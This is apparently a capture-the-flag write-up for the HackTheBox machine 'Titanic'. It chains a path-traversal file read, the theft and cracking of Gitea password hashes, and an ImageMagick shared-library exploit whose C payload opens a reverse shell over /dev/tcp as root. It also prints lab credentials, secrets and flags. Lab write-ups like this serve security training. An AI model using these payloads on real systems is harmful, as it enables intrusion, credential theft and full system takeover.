# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 80 | http |


# RECONNAISSANCE
---

![Pasted image 20250225131132.png](../../IMAGES/Pasted%20image%2020250225131132.png)

We need to add `titanic.htb` to `/etc/hosts`:

```
echo '10.10.11.55 titanic.htb' | sudo tee -a /etc/hosts
```

![Pasted image 20250225131217.png](../../IMAGES/Pasted%20image%2020250225131217.png)

We can see a `Book Now` functionality, let's check it out:

![Pasted image 20250225132420.png](../../IMAGES/Pasted%20image%2020250225132420.png)


We can try submitting some simple form and checking the behavior of the app using burp:

![Pasted image 20250225132757.png](../../IMAGES/Pasted%20image%2020250225132757.png)

After we make the request, we get another `GET` request to `/download` which tries to download a `.json` ticket regarding our booked trip, if we check the request, it goes like this:


![Pasted image 20250225132907.png](../../IMAGES/Pasted%20image%2020250225132907.png)

Seems suspicious, it seems like the server is reading files using the `/download` endpoint, if it somehow reads the internal server files, we could exploit a LFI, let's begin by testing the most basic LFI payload, if we suppose we are at `/var/www/html/download.php`, we need to submit the following payload:

```
../../../../etc/passwd
```

Let's test:

![Pasted image 20250225133202.png](../../IMAGES/Pasted%20image%2020250225133202.png)

And I was right, LFI is indeed possible in this endpoint, we can see the following in `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We found an user with a shell:

```
developer
```

I tried to brute force this user but there was no results, seems like we are missing something, let's fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb/ -H "Host:FUZZ.titanic.htb" -fc 301 -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://titanic.htb/
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response status: 301
________________________________________________

dev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 123ms]
```

We found a subdomain, let's add it to `/etc/hosts`:

```
dev.titanic.htb
```


# EXPLOITATION
---


![Pasted image 20250225135044.png](../../IMAGES/Pasted%20image%2020250225135044.png)

Now, we find ourselves in something called `Gitea`, we can explore and find the following repositories:

![Pasted image 20250225135114.png](../../IMAGES/Pasted%20image%2020250225135114.png)

Also, these users:

![Pasted image 20250225135122.png](../../IMAGES/Pasted%20image%2020250225135122.png)

Let's read the repos:

![Pasted image 20250225135206.png](../../IMAGES/Pasted%20image%2020250225135206.png)

We find this:

```yaml
version: '3.8'

services:
 mysql:
 image: mysql:8.0
 container_name: mysql
 ports:
 - "127.0.0.1:3306:3306"
 environment:
 MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
 MYSQL_DATABASE: tickets 
 MYSQL_USER: sql_svc
 MYSQL_PASSWORD: sql_password
 restart: always
```

And also this:

![Pasted image 20250225135256.png](../../IMAGES/Pasted%20image%2020250225135256.png)


```yaml
version: '3'

services:
 gitea:
 image: gitea/gitea
 container_name: gitea
 ports:
 - "127.0.0.1:3000:3000"
 - "127.0.0.1:2222:22" # Optional for SSH access
 volumes:
 - /home/developer/gitea/data:/data # Replace with your path
 environment:
 - USER_UID=1000
 - USER_GID=1000
 restart: always
```

Now, knowing we are dealing with `gitea`, once we do the research, we find the configuration file is located at `/data/gitea/conf/app.ini`, we can make use of the `LFI` to read the file:

![Pasted image 20250225135453.png](../../IMAGES/Pasted%20image%2020250225135453.png)

There we are, this is the configuration file:

```
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```


Now, we can see that we have the db file located at `/data/gitea/gitea.db`, we can download this file

```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

Now, we can make use of this command to get the user hashes:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

```ad-important
### **Step-by-Step Explanation**

1. **Extract Data from SQLite**
2. 
 `sqlite3 gitea.db "select passwd,salt,name from user"`
 
 - Queries the`user` table in`gitea.db` and returns three columns:
 
 - `passwd`: Password hash (stored as hex).
 
 - `salt`: Salt used for hashing (stored as hex).
 
 - `name`: Username.
 
2. **Process Each Line**
 
 `while read data; do ... done`
 - Loops through each line of the SQL query result (e.g.,`hash|salt|username`).
 
3. **Decode the Password Hash**
 
 `digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)`
 
 - `cut -d'|' -f1`: Extracts the first field (`passwd` hex string).
 
 - `xxd -r -p`: Converts hex to raw binary.
 
 - `base64`: Encodes the binary hash as base64.
 
 - Final result: Base64-encoded password hash.
 
4. **Decode the Salt**
 
 `salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)`
 
 - Same process as above, but extracts the second field (`salt`).
 
5. **Extract Username**
 
 `name=$(echo $data | cut -d'|' -f 3)`
 
 - `cut -d'|' -f3`: Gets the third field (`name`).
 
6. **Format for Password Cracking**

 `echo "${name}:sha256:50000:${salt}:${digest}"`
 
 
 - Outputs the data in the format:
 username:sha256:50000:<base64_salt>:<base64_digest>
 
 - `sha256`: Hashing algorithm (PBKDF2-SHA256 in Gitea).
 
 - `50000`: Number of iterations.
 
7. **Save Output**
 
 `| tee gitea.hashes`
 
 - Writes the formatted hashes to`gitea.hashes` and displays them on the terminal.
```


We get the following output:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes


administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
jimmy:sha256:50000:SSA8M0fsllcrScqVRxll1Q==:wnOGvOYSpdN8RrPjxlvCSjr25TJMm505WuohBMUEeJEyE8kpqjmC5FpfdJpbQ1ZJ6U0=
signingup:sha256:50000:2x8EpYBjLTxCfYlJtw7XXg==:OTLWbSiIpOBiDMi6syhVJN/3enAqxoXrM2l0qDTIS6HUX1+pujATc5dQEMkQGIiEoPc=
```


Now, our next step would be cracking the hashes:

```
hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
```

Once it cracks, we can check them:

```
hashcat gitea.hashes --show --user

developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
jimmy:sha256:50000:SSA8M0fsllcrScqVRxll1Q==:wnOGvOYSpdN8RrPjxlvCSjr25TJMm505WuohBMUEeJEyE8kpqjmC5FpfdJpbQ1ZJ6U0=:12345678
```

We can connect to ssh using the following credentials:

```
developer:25282528
```

Now we are able to get the first flag:

```
developer@titanic:~$ cat user.txt
707b718bb3700b8595aa1723e93622b3
```

Let's start privilege escalation.

# PRIVILEGE ESCALATION
---

We can begin by checking the writable directories:

```bash
find / -writable -type d 2>/dev/null
```

We get this:

![Pasted image 20250225143731.png](../../IMAGES/Pasted%20image%2020250225143731.png)

Now, if we check `/opt`, we can find a `/scripts` directory, it contains the following script:

![Pasted image 20250225143837.png](../../IMAGES/Pasted%20image%2020250225143837.png)

```
developer@titanic:/opt/scripts$ cat identify_images.sh

cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```


```ad-important
This script automates the extraction of metadata from all`.jpg` files in the`/opt/app/static/assets/images` directory and logs the results to`metadata.log`.

1. **Navigate to Images Directory**: 
 `cd /opt/app/static/assets/images` 
 Moves to the directory containing image files.
 
2. **Reset Log File**: 
 `truncate -s 0 metadata.log` 
 Clears the existing`metadata.log` (or creates an empty file).
 
3. **Extract Metadata**: 
 `find ... | xargs /usr/bin/magick identify >> metadata.log`
 
 - Uses`find` to list all`.jpg` files recursively.
 
 - Runs`magick identify` (ImageMagick) to extract metadata (e.g., dimensions, format, EXIF data).
 
 - Appends the results to`metadata.log`.
```

So, knowing this, we can check the version of the binary:

```
/usr/bin/magick --version

Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```


Let's search for an exploit regarding that version:

![Pasted image 20250225144440.png](../../IMAGES/Pasted%20image%2020250225144440.png)

We got it, an Arbitrary Code Execution in the `7.1.1-35` version of ImageMagick, let's read the PoC

![Pasted image 20250225145206.png](../../IMAGES/Pasted%20image%2020250225145206.png)

So, we need to go to `/opt/app/static/assets/images` and upload the following, for example, I changed it a bit to get a root as shell but we can simply change the command to give us `root.txt`:



```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
 system("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");
 exit(0);
}
EOF
```

Now, set up the listener and wait a bit:

![Pasted image 20250225145319.png](../../IMAGES/Pasted%20image%2020250225145319.png)

We got the root as shell, let's read the `/root/root.txt` file:

```
root@titanic:/opt/app/static/assets/images# cat /root/root.txt
af8e4f2c02faa0c837bebe5047abf4cf
```

Got our final flag:

```
af8e4f2c02faa0c837bebe5047abf4cf
```

![Pasted image 20250225145420.png](../../IMAGES/Pasted%20image%2020250225145420.png)
